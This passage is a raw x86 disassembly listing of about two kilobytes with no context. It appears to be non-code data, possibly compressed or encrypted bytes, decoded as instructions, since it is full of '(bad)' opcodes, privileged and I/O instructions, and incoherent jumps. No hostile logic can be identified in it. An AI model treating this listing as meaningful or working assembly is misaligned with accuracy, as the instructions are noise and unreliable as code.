  4101f7:	xor    al,0xc1
  4101f9:	sbb    DWORD PTR [ebx],ecx
  4101fb:	ins    BYTE PTR es:[edi],dx
  4101fc:	mov    ah,0x12
  4101fe:	xor    BYTE PTR [ecx+0x77],bl
  410201:	dec    eax
  410202:	cmp    edx,ecx
  410204:	loop   0x410235
  410206:	sbb    BYTE PTR [edi],al
  410208:	push   cs
  410209:	xchg   ebx,eax
  41020a:	sar    edx,cl
  41020c:	pusha  
  41020d:	ja     0x41028d
  41020f:	mov    DWORD PTR [eax+0x7c],esi
  410212:	nop
  410213:	fcomp  st(0)
  410215:	mov    ch,0xba
  410217:	popw   es
  410219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41021a:	sar    BYTE PTR [edi+0x1f52c96],1
  410220:	inc    esp
  410221:	fsub   st(3),st
  410223:	(bad)  
  410224:	and    esp,DWORD PTR [edi-0x14f5ae57]
  41022a:	adc    DWORD PTR [ebx-0x67],eax
  41022d:	dec    edx
  41022e:	ins    DWORD PTR es:[edi],dx
  41022f:	test   DWORD PTR [esi-0x26142853],ebp
  410235:	mov    ebx,0x334fb330
  41023a:	mov    al,ds:0x2fe3854a
  41023f:	jns    0x41021f
  410241:	adc    al,0x5
  410243:	sbb    ch,BYTE PTR [ebp+0x78a0a199]
  410249:	push   edi
  41024a:	jb     0x410248
  41024c:	jl     0x41028a
  41024e:	div    BYTE PTR [ecx+0x164ddd17]
  410254:	adc    esp,esi
  410256:	add    eax,0xbe0809f
  41025b:	mov    ebx,0xce2517e
  410260:	scas   eax,DWORD PTR es:[edi]
  410261:	ja     0x4102b9
  410263:	jmp    0x4102e4
  410265:	cs pop ebp
  410267:	mov    WORD PTR [esi],cs
  410269:	int    0xca
  41026b:	lea    edx,[ebx]
  41026d:	arpl   WORD PTR cs:[ecx+esi*8-0x553bb10],sp
  410275:	stos   DWORD PTR es:[edi],eax
  410276:	sar    DWORD PTR [eax+0x57],1
  410279:	mov    esi,0x66819756
  41027e:	inc    eax
  41027f:	scas   al,BYTE PTR es:[edi]
  410280:	mov    dh,0xa9
  410282:	add    BYTE PTR [edx+0x45],dh
  410285:	jle    0x410208
  410287:	mov    cs,esp
  410289:	js     0x41026d
  41028b:	pushf  
  41028c:	aad    0x1a
  41028e:	xchg   ebx,eax
  41028f:	ficom  DWORD PTR [ebx]
  410291:	and    al,0x86
  410293:	lods   eax,DWORD PTR ds:[esi]
  410294:	mov    bh,0xc8
  410296:	xor    ecx,DWORD PTR [edi]
  410298:	push   es
  410299:	aaa    
  41029a:	fild   QWORD PTR [edx]
  41029c:	pushf  
  41029d:	stos   DWORD PTR es:[edi],eax
  41029e:	adc    edi,DWORD PTR [esi]
  4102a0:	xchg   esi,eax
  4102a1:	inc    edx
  4102a2:	push   esi
  4102a3:	ror    DWORD PTR [ecx-0xfabc67],cl
  4102a9:	fsubrp st(7),st
  4102ab:	cdq    
  4102ac:	mov    edi,0x16b98cdc
  4102b1:	push   es
  4102b2:	jns    0x410311
  4102b4:	fldcw  WORD PTR [esi+0x61]
  4102b7:	inc    esp
  4102b8:	add    DWORD PTR [ecx+0x40],0x6e
  4102bc:	popf   
  4102bd:	inc    ecx
  4102be:	inc    ecx
  4102bf:	inc    esp
  4102c0:	jae    0x4102ca
  4102c2:	dec    ebp
  4102c3:	pop    edi
  4102c4:	cdq    
  4102c5:	fiadd  DWORD PTR [ebp-0x49]
  4102c8:	pop    ds
  4102c9:	push   es
  4102ca:	ins    DWORD PTR es:[edi],dx
  4102cb:	or     eax,0x614d1646
  4102d0:	adc    esp,ebp
  4102d2:	push   0x25
  4102d4:	and    eax,0xd8238671
  4102d9:	add    BYTE PTR [ebp+0x31f267e6],al
  4102df:	sub    dh,ah
  4102e1:	(bad)  
  4102e2:	sbb    BYTE PTR [ebx+0x55d602a7],al
  4102e8:	add    eax,0x5d15fbb2
  4102ed:	inc    ebp
  4102ee:	pushf  
  4102ef:	inc    edi
  4102f0:	out    0x65,al
  4102f2:	jnp    0x4102dd
  4102f4:	imul   edx,DWORD PTR [edx],0x7d09f89b
  4102fa:	retf   
  4102fb:	jo     0x4102a8
  4102fd:	xchg   ebx,eax
  4102fe:	cwde   
  4102ff:	icebp  
  410300:	push   edx
  410301:	mov    ds:0x160aa35,al
  410306:	call   0x51cf:0xfb45b65d
  41030d:	dec    edi
  41030e:	aam    0xbc
  410310:	lods   al,BYTE PTR ds:[esi]
  410311:	je     0x4102c8
  410313:	scas   al,BYTE PTR es:[edi]
  410314:	dec    ebp
  410315:	daa    
  410316:	clc    
  410317:	cdq    
  410318:	stc    
  410319:	lahf   
  41031a:	jg     0x410386
  41031c:	dec    eax
  41031d:	hlt    
  41031e:	fcomi  st,st(2)
  410320:	push   ecx
  410321:	push   edx
  410322:	and    al,0xda
  410324:	and    al,0xad
  410326:	sub    eax,0x911d353a
  41032b:	cmc    
  41032c:	jno    0x410379
  41032e:	push   ebp
  41032f:	imul   ebx,DWORD PTR [ebp+eax*2+0x52],0x8
  410334:	or     al,0xb5
  410336:	push   edx
  410337:	dec    ebp
  410338:	bound  si,DWORD PTR [eax-0x2b]
  41033c:	inc    esp
  41033d:	dec    esi
  41033e:	pushf  
  41033f:	sub    cl,0xcb
  410342:	jne    0x410327
  410344:	cmp    al,BYTE PTR [eax+esi*1-0x7d]
  410348:	fwait
  410349:	scas   eax,DWORD PTR es:[edi]
  41034a:	(bad)  
  41034b:	popf   
  41034c:	xchg   esp,eax
  41034d:	xlat   BYTE PTR ds:[ebx]
  41034e:	mov    bl,0x94
  410350:	shr    DWORD PTR [esi],1
  410352:	scas   al,BYTE PTR es:[edi]
  410353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410354:	leave  
  410355:	push   ecx
  410356:	(bad)  
  410357:	test   eax,0xa139dd7a
  41035c:	enter  0x444c,0xbf
  410360:	bound  ecx,QWORD PTR [ecx]
  410362:	dec    ebx
  410363:	xchg   esi,eax
  410364:	push   eax
  410365:	rcl    ebp,cl
  410367:	xor    cl,dh
  410369:	mov    eax,0xb11353f4
  41036e:	rcr    DWORD PTR [edi],0x20
  410371:	xor    al,0x80
  410373:	pop    ecx
  410374:	or     al,0xd8
  410376:	out    dx,al
  410377:	cdq    
  410378:	mov    dh,dl
  41037a:	loop   0x4103c8
  41037c:	sub    ah,dl
  41037e:	mov    esi,DWORD PTR ss:[eax+ebx*4+0x6b7c7705]
  410386:	adc    BYTE PTR [ecx+0x27],dh
  410389:	sbb    ebp,DWORD PTR [ebx+0x1e]
  41038c:	xchg   DWORD PTR [esi+0x19],edi
  41038f:	repz mov ds:0x43a516e2,al
  410395:	shl    eax,cl
  410397:	add    ebp,ecx
  410399:	setb   BYTE PTR [edx+0x24]
  41039d:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41039f:	jb     0x41037b
  4103a1:	lea    esp,[eax-0x4e]
  4103a4:	out    0xf0,al
  4103a6:	cwde   
  4103a7:	mov    WORD PTR ds:[edi+eax*8-0xb995df7],cs
  4103af:	aam    0xf0
  4103b1:	add    BYTE PTR [ebp-0x72],al
  4103b4:	addr16 inc ebp
  4103b6:	test   DWORD PTR [eax+0x17],esp
  4103b9:	iret   
  4103ba:	pusha  
  4103bb:	push   ss
  4103bc:	add    al,0x18
  4103be:	adc    DWORD PTR [esi+esi*8+0x12],ecx
  4103c2:	adc    al,0xbf
  4103c4:	push   ebp
  4103c5:	xchg   ecx,eax
  4103c6:	div    dl
  4103c8:	lods   al,BYTE PTR ds:[esi]
  4103c9:	sbb    dh,BYTE PTR [esi-0xeeffffa]
  4103cf:	xchg   ebx,eax
  4103d0:	adc    cl,BYTE PTR [edx+eiz*8-0x51]
  4103d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103d5:	mov    ds,WORD PTR [ecx+ebx*2-0x76]
  4103d9:	pop    ecx
  4103da:	push   eax
  4103db:	pop    ebx
  4103dc:	fwait
  4103dd:	das    
  4103de:	ins    DWORD PTR es:[edi],dx
  4103df:	fcmovbe st,st(6)
  4103e1:	pusha  
  4103e2:	mov    WORD PTR [esi-0x53],fs
  4103e5:	inc    ecx
  4103e6:	xchg   ebx,eax
  4103e7:	shr    BYTE PTR [ebx+ecx*4-0x2ce7e245],0x7f
  4103ef:	pop    ecx
  4103f0:	and    bl,BYTE PTR [edi+0x379f24ac]
  4103f6:	ins    DWORD PTR es:[edi],dx
  4103f7:	and    DWORD PTR [esi-0x1e6a7a83],esi
  4103fd:	mov    dl,0x6b
  4103ff:	scas   eax,DWORD PTR es:[edi]
  410400:	dec    eax
  410401:	(bad)  
  410402:	mov    eax,0xac4c82e0
  410407:	pop    edi
  410408:	(bad)  
  410409:	xchg   ecx,eax
  41040a:	jbe    0x410408
  41040c:	pop    es
  41040d:	push   ebp
  41040e:	loopne 0x410446
  410410:	(bad)  
  410412:	and    DWORD PTR [esi-0x9],ebp
  410415:	loop   0x410442
  410417:	pop    DWORD PTR [edx]
  410419:	dec    ebx
  41041a:	xor    al,0x53
  41041c:	push   ebp
  41041d:	enter  0x18c,0xb0
  410421:	mov    edx,0x74b1c031
  410426:	arpl   WORD PTR [eax+edx*8-0x50da5eb3],sp
  41042d:	push   eax
  41042e:	in     al,0xf6
  410430:	push   eax
  410431:	push   edi
  410432:	nop
  410433:	jecxz  0x41048a
  410435:	push   eax
  410436:	not    BYTE PTR [edx-0x7e6a86fd]
  41043c:	les    eax,FWORD PTR [esi+eax*8]
  41043f:	hlt    
  410440:	not    BYTE PTR [edx+0x57ca2d31]
  410446:	nop
  410447:	mov    eax,ds:0xdfa44807
  41044c:	leave  
  41044d:	mov    BYTE PTR [esi],al
  41044f:	sar    BYTE PTR ds:0x729d388e,0x63
  410456:	sbb    eax,0x7756c4c4
  41045b:	xor    eax,0x362f0781
  410460:	jns    0x4103e9
  410462:	kunpckwd k2,k5,k5
  410466:	js     0x41041a
  410468:	in     eax,dx
  410469:	mov    DWORD PTR ds:0xe1093096,edi
  41046f:	xor    DWORD PTR [edi],0x6bd9f11e
  410475:	paddusb mm7,QWORD PTR [edx+0x2e]
  410479:	(bad)  
  41047a:	(bad)  
  41047b:	push   esi
  41047c:	mov    ds:0x60c783bf,eax
  410481:	sub    cl,0x2d
  410484:	mov    al,ds:0x640b296e
  410489:	(bad)  
  41048a:	lock es pop ebx
  41048d:	jnp    0x4104f6
  41048f:	push   ebx
  410490:	push   es
  410491:	lods   al,BYTE PTR ds:[esi]
  410492:	jmp    0x410473
  410494:	xchg   edx,eax
  410495:	hlt    
  410496:	and    BYTE PTR [ebp+0x10a5fcdb],dh
  41049c:	and    ebx,esp
  41049e:	sbb    DWORD PTR [ebx-0x5de702a8],edi
  4104a4:	test   BYTE PTR [edi+edx*2+0x0],cl
  4104a8:	pop    edx
  4104a9:	sahf   
  4104aa:	test   BYTE PTR [ebx],bl
  4104ac:	sbb    DWORD PTR [eax-0x65b6b228],ebx
  4104b2:	push   0xffffffe0
  4104b4:	sti    
  4104b5:	cs test al,0x90
  4104b8:	popf   
  4104b9:	ja     0x4104bf
  4104bb:	sub    eax,ebp
  4104bd:	imul   esp,DWORD PTR [ebx-0x477c3f75],0xc227bb29
  4104c7:	mov    bh,0xd7
  4104c9:	mov    al,ds:0xb9a4e684
  4104ce:	ja     0x41052e
  4104d0:	aad    0x39
  4104d2:	bound  edi,QWORD PTR ds:0xb15d14da
  4104d8:	jmp    0x4104e9
  4104da:	mov    BYTE PTR ds:0x1aa81ece,0x39
  4104e1:	push   esi
  4104e2:	arpl   WORD PTR [eax],di
  4104e4:	out    0xe7,eax
  4104e6:	leave  
  4104e7:	jne    0x4104f8
  4104e9:	pop    ds
  4104ea:	pop    ss
  4104eb:	loop   0x41051b
  4104ed:	les    ecx,FWORD PTR [edx]
  4104ef:	ss js  0x410482
  4104f2:	pop    esp
  4104f3:	adc    edx,ecx
  4104f5:	ret    
  4104f6:	or     eax,0xf879fa5c
  4104fb:	es fs xchg esp,eax
  4104fe:	std    
  4104ff:	cld    
  410500:	pop    esi
  410501:	clc    
  410502:	test   al,0x46
  410504:	adc    dl,BYTE PTR [edi-0x6d7a7321]
  41050a:	xchg   ebp,eax
  41050b:	loopne 0x41051f
  41050d:	dec    ebx
  41050e:	jae    0x41058e
  410510:	push   edi
  410511:	xor    BYTE PTR [ecx+0x79],0xcb
  410515:	mov    ch,0xee
  410517:	into   
  410518:	sub    al,0x3d
  41051a:	clc    
  41051b:	mov    ebx,0x511a534b
  410520:	fadd   DWORD PTR [ebx+0x2ad9fa6a]
  410526:	xor    cl,bh
  410528:	sbb    ebp,DWORD PTR [edi-0x24]
  41052b:	cmp    al,0x22
  41052d:	mov    dh,0x40
  41052f:	outs   dx,BYTE PTR ds:[esi]
  410530:	aad    0xcb
  410532:	mov    ds,WORD PTR [eax]
  410534:	mov    ecx,0xd88e73b9
  410539:	test   eax,0x8b3ef774
  41053e:	pop    edx
  41053f:	mov    edi,0xa7a71967
  410544:	repz inc ebp
  410546:	scas   al,BYTE PTR es:[edi]
  410547:	jae    0x410508
  410549:	jae    0x41052b
  41054b:	mov    bh,0xf7
  41054d:	pusha  
  41054e:	ret    
  41054f:	pop    edx
  410550:	dec    edi
  410551:	dec    esi
  410552:	nop
  410553:	retf   0x5e03
  410556:	bnd jae 0x4104db
  410559:	mov    dl,0xbe
  41055b:	mov    BYTE PTR [edx-0x2],bl
  41055e:	or     ebp,DWORD PTR [ecx-0x68675785]
  410564:	popf   
  410565:	and    DWORD PTR [ecx],edx
  410567:	dec    ebx
  410568:	adc    esi,edx
  41056a:	test   DWORD PTR [ebp-0x2ec9115f],ecx
  410570:	daa    
  410571:	into   
  410572:	jge    0x41051c
  410574:	lahf   
  410575:	(bad)  
  410576:	mov    al,ds:0x18aabf2d
  41057b:	adc    eax,0xb5c3915f
  410580:	stc    
  410581:	xchg   ebp,eax
  410582:	xchg   ebx,eax
  410583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410584:	mov    al,0x57
  410586:	addr16 pop ebx
  410588:	sbb    BYTE PTR [ecx],ch
  41058a:	fld    DWORD PTR [ecx-0x5]
  41058d:	in     al,0xc7
  41058f:	jmp    0xa10c:0xbed65623
  410596:	mov    ds:0x52b71ed7,eax
  41059b:	mov    DWORD PTR [edx-0x53685677],edi
  4105a1:	test   eax,0x26efcc48
  4105a6:	nop
  4105a7:	adc    al,0xf7
  4105a9:	inc    edx
  4105aa:	sbb    BYTE PTR [edi-0x3b5fa834],ch
  4105b0:	dec    edi
  4105b1:	retf   0x4513
  4105b4:	sub    al,0xa9
  4105b6:	mov    ebx,0x7a9ecf84
  4105bb:	lods   al,BYTE PTR ds:[esi]
  4105bc:	jge    0x4105f1
  4105be:	jns    0x410581
  4105c0:	loop   0x41061d
  4105c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105c3:	add    BYTE PTR [ecx],0x32
  4105c6:	rol    BYTE PTR [ebx+0x5442ca8b],1
  4105cc:	jns    0x41062b
  4105ce:	repnz int3 
  4105d0:	mov    al,0xbb
  4105d2:	push   0x982bcd97
  4105d7:	or     bl,dl
  4105d9:	shr    BYTE PTR [eax],0xde
  4105dc:	adc    eax,ebp
  4105de:	retf   0x19b6
  4105e1:	test   eax,0x29100a80
  4105e6:	pushf  
  4105e7:	push   ss
  4105e8:	mov    esp,0x324fb6a1
  4105ed:	ror    ebp,cl
  4105ef:	std    
  4105f0:	ds retf 
  4105f2:	push   0x0
  4105f4:	mov    BYTE PTR [eax],cl
  4105f6:	aad    0x9b
  4105f8:	or     eax,0x13c340cc
  4105fd:	mov    al,ds:0xd9ffb837
  410602:	jg     0x410596
  410604:	hlt    
  410605:	dec    ebp
  410606:	cld    
  410607:	in     eax,dx
  410608:	je     0x4105b0
  41060a:	jb     0x4105e4
  41060c:	cmp    eax,DWORD PTR [ebx+esi*4+0x1ac23a50]
  410613:	retf   0x78ae
  410616:	aas    
  410617:	test   cl,cl
  410619:	fisub  DWORD PTR [esi+0x6c7e1386]
  41061f:	mov    al,al
  410621:	xchg   DWORD PTR [edx-0x191658f6],edi
  410627:	inc    ebx
  410628:	mov    ebx,0x9273457f
  41062d:	ret    
  41062e:	push   eax
  41062f:	je     0x41064c
  410631:	mov    dl,0xb9
  410633:	xor    al,0x3b
  410635:	and    eax,0x3c5e2429
  41063a:	fwait
  41063b:	sbb    BYTE PTR [ecx+0x190c63a6],dl
  410641:	sub    BYTE PTR [edi-0x2761183c],0x90
  410648:	dec    esp
  410649:	in     eax,dx
  41064a:	sub    al,0x15
  41064c:	and    al,0x84
  41064f:	loopne 0x41064c
  410651:	fs int3 
  410653:	or     eax,0x3ddc5a86
  410658:	test   DWORD PTR fs:[ebx+0x37],edx
  41065c:	fstp   DWORD PTR [ecx+eiz*4]
  41065f:	add    DWORD PTR [esp+ecx*8-0x7e],ebx
  410663:	xlat   BYTE PTR ds:[ebx]
  410664:	out    0x2,al
  410666:	cmp    al,0x24
  410668:	and    ah,bl
  41066a:	loop   0x410643
  41066c:	lock inc esi
  41066e:	lock jno 0x410667
  410671:	xchg   DWORD PTR [esi-0x18],esp
  410674:	sbb    eax,0xa029df03
  410679:	mov    ds:0x3886ab05,eax
  41067e:	mov    ch,0xaf
  410680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410681:	jmp    0x4ef7:0xf025a6d3
  410688:	out    0x2b,al
  41068a:	ss inc edi
  41068c:	sbb    edx,ebp
  41068e:	mov    edi,0xdc31127d
  410693:	add    ebx,ebp
  410695:	imul   dh
  410697:	mov    edx,0xf309b940
  41069c:	xor    ebp,DWORD PTR ds:0x643cfb24
  4106a2:	psubusb mm5,QWORD PTR [ebp+0xbdb0b1]
  4106a9:	inc    edi
  4106aa:	push   eax
  4106ab:	lea    ebp,[edx-0x14]
  4106ae:	add    edx,DWORD PTR [edx]
  4106b0:	xor    dh,BYTE PTR [esi]
  4106b2:	push   ebx
  4106b3:	pop    ss
  4106b4:	imul   esi,DWORD PTR [edi-0x66],0xc6a422f6
  4106bb:	adc    eax,0x7b721875
  4106c0:	int3   
  4106c1:	stc    
  4106c2:	out    dx,eax
  4106c3:	ror    BYTE PTR [edx-0x5c173f0d],1
  4106c9:	push   ebx
  4106ca:	sahf   
  4106cb:	adc    DWORD PTR [ecx-0x50],ebx
  4106ce:	sar    bh,1
  4106d0:	mov    esp,0x27a88a5f
  4106d5:	push   ss
  4106d6:	or     DWORD PTR [ebx+eiz*8-0x473c5037],edi
  4106dd:	pop    ebx
  4106de:	mov    eax,ds:0x7c5a5766
  4106e3:	xchg   DWORD PTR [edx-0x32ca30a6],ebp
  4106e9:	sbb    ebx,DWORD PTR [eax+0x27]
  4106ec:	test   BYTE PTR [edi+ecx*2-0xa],dh
  4106f0:	pop    ebx
  4106f1:	into   
  4106f2:	cdq    
  4106f3:	sub    esi,eax
  4106f5:	loop   0x41069a
  4106f7:	and    eax,0xcf313fd6
  4106fc:	outs   dx,DWORD PTR ds:[esi]
  4106fd:	hlt    
  4106fe:	popf   
  4106ff:	leave  
  410700:	add    al,0x17
  410702:	out    dx,al
  410703:	xchg   esi,eax
  410704:	mov    eax,esi
  410706:	je     0x410783
  410708:	popa   
  410709:	fdivr  DWORD PTR [edx]
  41070b:	pop    es
  41070c:	and    BYTE PTR [ecx+0x297c5f2f],bl
  410712:	or     eax,0x89f0e9cd
  410717:	cmp    DWORD PTR ds:0xcddf43e7,ecx
  41071d:	in     al,0xe2
  41071f:	sub    eax,0xf7ab9b69
  410724:	xlat   BYTE PTR ds:[ebx]
  410725:	icebp  
  410726:	aam    0x2
  410728:	xchg   esi,eax
  410729:	jne    0x41075b
  41072b:	mov    eax,0x339bbe58
  410730:	mov    ds:0x886227b4,al
  410735:	shr    DWORD PTR [edx+eax*8],0x29
  410739:	add    eax,0x1b971787
  41073e:	or     eax,0x50882482
  410743:	mov    ch,BYTE PTR [ecx+esi*8+0x58]
  410747:	into   
  410748:	mov    edx,0x722e1668
  41074d:	mov    al,ds:0xba731ced
  410752:	jmp    0x3d37:0x259e6148
  410759:	pop    eax
  41075a:	mov    ebp,DWORD PTR [esi]
  41075c:	imul   ebp,DWORD PTR [edi-0x4c70d777],0x1880a763
  410766:	adc    dl,BYTE PTR [edi-0x12]
  410769:	cld    
  41076a:	pop    es
  41076b:	dec    eax
  41076c:	cs out 0xb1,al
  41076f:	outs   dx,DWORD PTR ds:[esi]
  410770:	sub    BYTE PTR [ebx+0x1aa3c669],ah
  410776:	jl     0x4107e1
  410778:	xchg   edx,eax
  410779:	sbb    BYTE PTR [edi-0x48],bl
  41077c:	dec    eax
  41077d:	imul   ebx,DWORD PTR [ebx+0x67171838],0xffffffbb
  410784:	cli    
  410785:	add    BYTE PTR [edi],ah
  410787:	and    BYTE PTR [eax+edi*2],0x1d
  41078b:	and    bl,bh
  41078d:	lea    ebp,[edi+0x281624d5]
  410793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410794:	dec    ebx
  410795:	retf   0xab77
  410798:	mov    ds:0xd1e94b86,al
  41079d:	cmc    
  41079e:	or     ah,BYTE PTR [edx]
  4107a0:	push   esp
  4107a1:	jne    0x4107dd
  4107a3:	adc    al,0xec
  4107a5:	pop    ebx
  4107a6:	xchg   edi,eax
  4107a7:	in     eax,0x93
  4107a9:	fwait
  4107aa:	enter  0x8fb8,0x5a
  4107ae:	imul   esp,DWORD PTR [ebx],0x7dc1ff6e
  4107b4:	sub    eax,0xcad60f
  4107b9:	jne    0x4107fc
  4107bb:	lock adc al,0xcd
  4107be:	cwde   
  4107bf:	push   ds
  4107c0:	adc    esp,DWORD PTR [eax]
  4107c2:	loopne 0x4107df
  4107c4:	cwde   
  4107c5:	stc    
  4107c6:	into   
  4107c7:	xchg   edi,eax
  4107c8:	lea    esi,[ebx-0x45]
  4107cb:	fiadd  WORD PTR [esi+eax*2-0xf]
  4107d0:	(bad)  
  4107d1:	adc    al,0xb8
  4107d3:	loopne 0x4107ac
  4107d5:	arpl   bx,dx
  4107d7:	jl     0x4107af
  4107d9:	out    0xd0,al
  4107db:	sub    esp,ebx
  4107dd:	xchg   ecx,eax
  4107de:	mov    ch,BYTE PTR [edx+0x66]
  4107e1:	aas    
  4107e2:	jle    0x4107c4
  4107e4:	mov    dl,0x7d
  4107e6:	mov    al,0x56
  4107e8:	lods   al,BYTE PTR ds:[esi]
  4107e9:	rol    BYTE PTR [ebx+0x55],cl
  4107ec:	test   al,0xd
  4107ee:	jb     0x4107d0
  4107f0:	mov    dh,0xd5
  4107f2:	loope  0x41081f
  4107f4:	mov    bh,cl
  4107f6:	sti    
  4107f7:	lock aaa 
  4107f9:	int3   
  4107fa:	std    
  4107fb:	mov    edx,0xf2b8b0f1
  410800:	sub    eax,0x2ee13cb8
  410805:	or     edx,edx
  410807:	xchg   esp,eax
  410808:	xchg   BYTE PTR [ecx],bh
  41080a:	imul   BYTE PTR [ecx-0x2011a5f5]
  410810:	hlt    
  410811:	or     esi,DWORD PTR [edi+0x38]
  410814:	retf   0x39a9
  410817:	mov    esi,DWORD PTR [esi-0x21ff2d2]
  41081d:	jecxz  0x410864
  41081f:	jecxz  0x410877
  410821:	sbb    al,0xe6
  410823:	ffreep st(7)
  410825:	hlt    
  410826:	push   ecx
  410827:	jmp    0x41082a
  410829:	fs jb  0x410807
  41082c:	push   ss
  41082d:	or     cl,bh
  41082f:	dec    ebp
  410830:	pushf  
  410831:	mov    ebp,0xb453bde6
  410836:	test   DWORD PTR [ebx-0xf],ebx
  410839:	xor    ecx,ebx
  41083b:	jae    0x410838
  41083d:	add    al,0x42
  41083f:	xor    ebp,DWORD PTR [ebx+0xc]
  410842:	push   edi
  410843:	dec    eax
  410844:	rcl    edx,cl
  410846:	mov    bh,0x61
  410848:	nop
  410849:	mov    ds:0xd8a28204,al
  41084e:	cmp    eax,0x44be2b0e
  410853:	jl     0x410832
  410855:	jns    0x4108b9
  410857:	sbb    DWORD PTR [eax+ebx*8],ecx
  41085a:	mov    gs,ecx
  41085c:	adc    edx,DWORD PTR [esi+0x68dbb4ba]
  410862:	data16 int 0x52
  410865:	adc    al,0xdb
  410867:	out    0x67,al
  410869:	xor    al,0x5f
  41086b:	sub    al,BYTE PTR [ecx-0x1cbad1a8]
  410871:	scas   eax,DWORD PTR es:[edi]
  410872:	jae    0x41083e
  410874:	mov    ch,0x9c
  410876:	aas    
  410877:	outs   dx,BYTE PTR ds:[esi]
  410878:	(bad)  
  410879:	pop    ss
  41087a:	inc    ebx
  41087b:	fist   WORD PTR [ecx]
  41087d:	ss stos DWORD PTR es:[edi],eax
  41087f:	out    dx,al
  410880:	or     esp,DWORD PTR [ebp+0x4c]
  410883:	lock sahf 
  410885:	pop    ebx
  410886:	std    
  410887:	inc    esp
  410888:	inc    esp
  410889:	and    esi,DWORD PTR [esi+esi*4]
  41088c:	cmp    al,0xd0
  41088e:	lods   eax,DWORD PTR ds:[esi]
  41088f:	and    BYTE PTR [ecx+0x55c53b97],ch
  410895:	add    al,0x91
  410897:	fidivr WORD PTR [edi+0x16]
  41089a:	sbb    eax,0x40117239
  41089f:	outs   dx,DWORD PTR ds:[esi]
  4108a1:	cdq    
  4108a2:	inc    eax
  4108a3:	test   eax,0xe6299fc9
  4108a8:	inc    esp
  4108a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108aa:	in     eax,0xdc
  4108ac:	sbb    eax,DWORD PTR [esi]
  4108ae:	inc    eax
  4108af:	icebp  
  4108b0:	test   BYTE PTR [ebp+0x3e60c071],ch
  4108b6:	cdq    
  4108b7:	lea    esi,[esi]
  4108b9:	dec    ebp
  4108ba:	fwait
  4108bb:	add    ah,BYTE PTR [eax-0x7f]
  4108be:	push   esp
  4108bf:	loopne 0x41088e
  4108c1:	scas   al,BYTE PTR es:[edi]
  4108c2:	(bad)  
  4108c3:	push   DWORD PTR [ebx]
  4108c5:	pop    ecx
  4108c6:	test   DWORD PTR [edx],eax
  4108c8:	mov    ebx,0x27d834bd
  4108ce:	shl    BYTE PTR [ebx],1
  4108d0:	ret    
  4108d1:	outs   dx,DWORD PTR ds:[esi]
  4108d2:	add    ebp,esi
  4108d4:	pop    ss
  4108d5:	popa   
  4108d6:	ret    0x9656
  4108d9:	pop    edx
  4108da:	pushf  
  4108db:	jmp    0xc76b69f
  4108e0:	stos   DWORD PTR es:[edi],eax
  4108e1:	jae    0x410962
  4108e3:	mov    al,ds:0x55a71e9d
  4108e8:	pop    esi
  4108e9:	enter  0x989,0x0
  4108ed:	lock retf 
  4108ef:	stos   BYTE PTR es:[edi],al
  4108f0:	repnz or DWORD PTR [eax],ecx
  4108f3:	pop    ebx
  4108f4:	cmp    eax,0x84c72d02
  4108f9:	push   es
  4108fa:	or     al,0x9b
  4108fc:	jbe    0x410915
  4108fe:	test   BYTE PTR [edi-0x3614373d],ah
  410904:	pop    ebp
  410905:	mov    esi,DWORD PTR [ebx+esi*4]
  410908:	out    dx,eax
  410909:	jle    0x4108a3
  41090b:	push   ebp
  41090c:	dec    ebp
  41090d:	adc    eax,0x73dd5cbc
  410912:	xor    esp,esp
  410914:	push   es
  410915:	in     al,dx
  410916:	and    bl,BYTE PTR [ecx+0x32]
  410919:	xor    bl,BYTE PTR cs:[esp+esi*2+0x39]
  41091e:	ds iret 
  410920:	sub    al,0x60
  410922:	push   ebx
  410923:	shl    BYTE PTR [ecx+0x51],cl
  410926:	push   ds
  410927:	rol    DWORD PTR [ebx-0x70e37e93],0x6
  41092e:	mov    al,ds:0x719aba22
  410933:	faddp  st(2),st
  410935:	(bad)  
  410936:	lock lea ecx,[edi]
  410939:	adc    BYTE PTR [edi+edi*1+0x2d],dh
  41093d:	and    BYTE PTR [edi+0x6d],cl
  410940:	mov    esi,0x7c9caf0d
  410945:	rol    BYTE PTR [ecx-0x373c7d94],0xb7
  41094c:	ins    DWORD PTR es:[edi],dx
  41094d:	aaa    
  41094e:	adc    eax,0x4847990d
  410953:	jmp    0x4109d1
  410955:	cs sti 
  410957:	mov    ah,0xd6
  410959:	fisttp DWORD PTR [edx+0x78]
  41095c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41095d:	xchg   ebp,ebp
  41095f:	pop    esi
  410960:	sub    DWORD PTR [ebp-0x1b3d4e20],esp
  410966:	jno    0x410984
  410968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410969:	jmp    0x9f591b02
  41096e:	stc    
  41096f:	mov    DWORD PTR [eax-0xbd4d8dd],ecx
  410975:	loop   0x4109a3
  410977:	push   edx
  410978:	daa    
  410979:	mov    edi,DWORD PTR [edx+0x54027bde]
  41097f:	rol    DWORD PTR [edi],cl
  410981:	in     al,0xbe
  410983:	sbb    bl,bh
  410985:	mov    bh,0x95
  410987:	dec    ebp
  410988:	idiv   DWORD PTR [ebp+0x18]
  41098b:	jne    0x4109ee
  41098d:	jecxz  0x41094f
  41098f:	arpl   si,sp
  410991:	lds    esi,FWORD PTR [edx-0x41]
  410994:	and    BYTE PTR [esi+0x55],al
  410997:	pop    ds
  410998:	pop    ss
  410999:	addr16 (bad) 
  41099b:	repnz test eax,0x578029a
  4109a1:	stc    
  4109a2:	lea    ecx,[ebp+0xa6f8667]
  4109a8:	push   0xa23ffcdf
  4109ad:	mov    eax,ds:0xa88058a2
  4109b2:	xchg   edi,eax
  4109b3:	push   esi
  4109b4:	inc    edi
  4109b6:	mov    esi,0xc8de7375
  4109bb:	dec    esi
  4109bc:	pop    ebx
  4109bd:	das    
  4109be:	shl    ah,0x85
  4109c1:	lock xor edi,DWORD PTR [ebx]
  4109c4:	mov    ebx,0x48f49345
  4109c9:	jo     0x410a2f
  4109cb:	dec    ecx
  4109cc:	jns    0x410951
  4109ce:	ds into 
